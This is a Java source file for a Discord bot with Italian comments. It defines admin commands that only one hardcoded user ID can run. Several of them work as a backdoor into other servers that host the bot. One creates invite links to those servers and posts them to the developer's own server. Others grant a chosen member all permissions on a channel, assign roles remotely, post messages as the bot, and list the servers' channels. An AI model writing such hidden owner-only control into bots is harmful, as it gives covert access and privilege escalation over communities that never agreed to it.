package commands;

import db.*;
import main.*;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.GuildChannel;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageHistory;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.jetbrains.annotations.NotNull;
import utility.*;

import java.awt.*;
import java.sql.*;
import java.util.List;

import static main.DumbledoreMain.prefix;

public class AdminCommands extends ListenerAdapter {

    public static boolean DominyOnOff = false;


    public void onGuildMessageReceived(@NotNull GuildMessageReceivedEvent event) {
        super.onGuildMessageReceived(event);

        Guild guild = event.getGuild();
        String[] args = event.getMessage().getContentRaw().split("\\s+");

        DbCredentials credentials = new DbCredentials();

        String username = credentials.getUsername();
        String password = credentials.getPassword();

        int count = 0;

        EmbedBuilder activeCommand = new EmbedBuilder()
                .setColor(Color.green)
                .setDescription("Comando Eseguito");


        //ADMIN COMMAND LIST

        // ------------------------------------------------------------------------------------------------- //

        if (guild.getId().equals(DumbledoreMain.botDiscordID)
                && event.getAuthor().getId().equalsIgnoreCase("383035474807095296")
                && event.getChannel().getId().equalsIgnoreCase("856626062779088966")) {
            // SE L'AUTORE DEL MESSAGGIO E' DOMINY E SE SI E' NEL CANALE DI COMANDI BOT

            if (args[0].equalsIgnoreCase(prefix + "admin")
                    && args[1].equalsIgnoreCase("command")) {
                event.getChannel()
                        .sendMessage("Lista di comandi ADMIN: \n"
                                + "- check serverlist \n"
                                + "- ~~print serverListID (from DB)~~\n"
                                + "- ~~print serverListName (from DB)~~\n"
                                + "- print guildchannel (GuID)\n"
                                + "- ~~reload serverlistID~~ (disabled) \n"
                                + "- add channel-log (ChID) \n"
                                + "- add remote channel-log (GuID) \n"
                                + "- remote sendcmd (GuID) (ChID) (Args) (Args) \n"
                                + "- remote sendmsg (GuID) (ChID) (msg) \n"
                                + "- modify allchannel-permission (chID) (guildID) (memberID)\n"
                                + "- compile modify channel-permission\n"
                                + "- manutention\n"
                                + "- search channel (guID)"
                        ).queue();

            }

            if (args[0].equalsIgnoreCase(prefix + "prova")) {
                event.getJDA().getGuildById("857905157840961547").createTextChannel("annunci-ic").queue();
                System.out.println("creato");
            }

            if (args[0].equalsIgnoreCase(prefix + "search")
                    && args[1].equalsIgnoreCase("channel")) {
                System.out.println(event.getJDA().getGuildById(args[2]).getTextChannelsByName("bot-channel-log", true));

            }

            if (args[0].equalsIgnoreCase(prefix + "check")
                    && args[1].equalsIgnoreCase("serverlist")) {


                List<Guild> serverList = event.getJDA().getGuilds();
                List<GuildChannel> channelList = event.getGuild().getChannels();

                event.getChannel().sendMessage(Utility.getServerListNameID(serverList)).queue();
                event.getChannel().sendMessage(activeCommand.build()).queue();

            }

            if (guild.getId().equals(DumbledoreMain.botDiscordID)
                    && args[0].equalsIgnoreCase(prefix + "print")
                    && args[1].equalsIgnoreCase("serverList")) {

                try {
                    Connection connection = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/test", username, password);

                    // SELECT FROM DB MYSQL
                    String sql = "SELECT * FROM `tab1`";

                    Statement statement = connection.createStatement();
                    ResultSet result = statement.executeQuery(sql);

                    while (result.next()) {
                        String row1 = result.getString(1);
                        String row2 = result.getString(2);
                        String row3 = result.getString(3);
                        String row4 = result.getString(4);
                        String row5 = result.getString(5);

                        count++;
                        event.getChannel().sendMessage(row1 + ") " + row3 + " " + row2 + " init: " + row5).queue();

                    }


                } catch (SQLException e) {

                    e.printStackTrace();
                }
                event.getChannel().sendMessage(activeCommand.build()).queue();
            }

    /*            if (args[0].equalsIgnoreCase(DumbledoreMain.prefix + "reload")
                        && args[1].equalsIgnoreCase("serverlistID")) {

                    List<GuildChannel> channelList = event.getGuild().getChannels();

                    try {
                        Connection connection = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/test", username, password);

                        // SELECT FROM DB MYSQL
                        String sql = "SELECT * FROM `tab1`";

                        Statement statement = connection.createStatement();
                        ResultSet result = statement.executeQuery(sql);


                        while (result.next()) {
                            String row1 = result.getString(1);
                            String row2 = result.getString(2);
                            String row3 = result.getString(3);
                            count++;


                            if ((!Utility.getChannelListName(channelList).contains(row2))) {
                                guild.createTextChannel(row2).queue();
                                event.getChannel().sendMessage(activeCommand.build()).queue();
                            }
                        }

                    } catch (SQLException e) {


                    }

                }*/

            if (args[0].equalsIgnoreCase(prefix + "print")
                    && args[1].equalsIgnoreCase("guildchannel")) {
                String idCh = args[2];
                List<GuildChannel> channelList = event.getGuild().getChannels();
                List<GuildChannel> guildChannelList = event.getJDA().getGuildById(args[2]).getChannels();

                try {
                    event.getChannel().sendMessage("```" + Utility.getChannelListNameID(guildChannelList) + "```").queue();
                } catch (IndexOutOfBoundsException exception) {
                    event.getChannel().sendMessage("Non ho abbastanza poteri per controllare").queue();
                }


                event.getChannel().sendMessage(activeCommand.build()).queue();
            }

            if (args[0].equalsIgnoreCase(prefix + "add")
                    && args[1].equalsIgnoreCase("channel-log")) {
                String chName = args[2];
                event.getGuild().createTextChannel(chName).queue();
            } else if (args[0].equalsIgnoreCase(prefix + "add")
                    && args[1].equalsIgnoreCase("remote")
                    && args[2].equalsIgnoreCase("channel-log")) {

                String guildID = args[3];

                event.getJDA().getGuildById(args[3]).createTextChannel("channel-log")
                        .queue();

                event.getChannel().sendMessage(activeCommand.build()).queue();

            }

            if (args[0].equalsIgnoreCase(prefix + "modify")
                    && args[1].equalsIgnoreCase("allchannel-permission")) {


                String chID = args[2];
                String guildID = args[3];
                String memberID = args[4];

                event.getJDA().getGuildById(guildID).getTextChannelById(chID)
                        .createPermissionOverride(event.getJDA().getGuildById(guildID)
                                .getMemberById(memberID))
                        .setAllow(Permission.ALL_PERMISSIONS)
                        .queue();


            } else if (args[0].equalsIgnoreCase(prefix + "compile")
                    && args[1].equalsIgnoreCase("modify")
                    && args[2].equalsIgnoreCase("channel-permission")) {

                event.getChannel().sendMessage("modify channel-permission (chID) (guildID) (memberID)").queue();
            }

            if (args[0].equalsIgnoreCase(prefix + "read")
                    && args[1].equalsIgnoreCase("history-channel")) {

                MessageHistory h = event.getChannel().getHistory();
                h.retrievePast(30).complete();
                List<Message> ml = h.getRetrievedHistory();
                String tempml = ml + "\n";

                event.getChannel().getHistory().retrievePast(10);

                event.getChannel().sendMessage(tempml).queue();
            }

            if (args[0].equalsIgnoreCase(prefix + "remote")
                    && args[1].equalsIgnoreCase("sendcmd")) {

                String guildID = args[2];
                String chID = args[3];

                event.getJDA().getGuildById(guildID)
                        .getTextChannelById(chID).sendMessage(args[4] + " " + args[5]).queue();
            }

            if (args[0].equalsIgnoreCase(prefix + "remote")
                    && args[1].equalsIgnoreCase("sendmsg")) {

                String guildID = args[2];
                String chID = args[3];
                String msg = event.getMessage().getContentRaw()
                        .replace(guildID, "")
                        .replace(chID, "")
                        .replace("d-remote sendmsg", "");

                event.getJDA().getGuildById(guildID).getTextChannelById(chID).sendMessage(msg).queue();
            }

            if (args[0].equalsIgnoreCase(prefix + "manutention")) {

                try {
                    Connection connection = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/test", username, password);

                    // SELECT FROM DB MYSQL
                    String sql = "SELECT * FROM `tab1` WHERE `init` = 'yes'";

                    Statement statement = connection.createStatement();
                    ResultSet result = statement.executeQuery(sql);

                    while (result.next()) {
                        String row1 = result.getString(1);
                        String row2 = result.getString(2);
                        String row3 = result.getString(3);
                        String row4 = result.getString(4); //bot_channel_log

                        count++;

                        EmbedBuilder manutention = new EmbedBuilder().setColor(0xff0000)
                                .setTitle("UNDER MAINTENANCE")
                                .setThumbnail("https://i.postimg.cc/Xq5VZPMx/Cattura.png")
                                .addBlankField(true)
                                .addField("Message from Developer", "The Bot is under maintenance, this means that there could be " +
                                        "slowdowns or it could go down. If your server has the \"full kit\" service, your server will not have any problems." +
                                        "\r Thanks for understanding.", true);


                        event.getJDA().getGuildById(row2).getTextChannelById(row4).sendMessage(manutention.build()).queue();

                    }


                } catch (SQLException e) {

                    e.printStackTrace();
                }

            }

            if (args[0].equalsIgnoreCase(prefix + "sendInvite")) {

                String guildID = args[1];
                String inviteCH = args[2];
                String serverInvite;

                try {
                    event.getJDA().getGuildById(DumbledoreMain.botDiscordID)
                            .getTextChannelById("857557884003287111")
                            .sendMessage(event.getJDA().getGuildById(guildID).getTextChannelById(inviteCH).createInvite().complete().getUrl()).queue();
                    //                event.getChannel().sendMessage().queue();




                    System.out.println(event.getJDA().getGuildById(guildID).getTextChannelById(inviteCH).createInvite().complete().getUrl());

                } catch (IndexOutOfBoundsException exception) {
                    System.out.println("Problema con comando testinv");
                }
            }

            if (args[0].equalsIgnoreCase(prefix + "add")
                    && args[1].equalsIgnoreCase("role")) { //non funziona per via dei privileggi

                try {
                    String guildID = args[2];
                    String memberID = args[3];
                    String roleID = args[4];

                    event.getJDA().getGuildById(guildID).addRoleToMember(memberID, event.getJDA().getGuildById(guildID).getRoleById(roleID));

                    event.getChannel().sendMessage(activeCommand.build()).queue();
                } catch (IndexOutOfBoundsException exception){
                    exception.printStackTrace();

                }
            }

            if (event.getMessage().getContentRaw().equalsIgnoreCase(prefix + "DominyOn") && !DominyOnOff) {
                event.getMessage().delete().queue();
                DominyOnOff = true;
                event.getChannel().sendMessage("CMD ON").queue();
            } else if (event.getMessage().getContentRaw().equalsIgnoreCase(prefix + "DominyOff") && DominyOnOff) {
                event.getMessage().delete().queue();
                DominyOnOff = false;
                event.getChannel().sendMessage("CMD OFF").queue();
            } else if (DominyOnOff && event.getMessage().getContentRaw().equalsIgnoreCase(prefix + "DominyOn")) {
                event.getMessage().delete().queue();
                DominyOnOff = true;
                event.getChannel().sendMessage("CMD già attivo!").queue();
            } else if (!DominyOnOff && event.getMessage().getContentRaw().equalsIgnoreCase(prefix + "DominyOff")) {
                event.getMessage().delete().queue();
                DominyOnOff = false;
                event.getChannel().sendMessage("CMD già disattivo!").queue();
            }
        }
    }
}
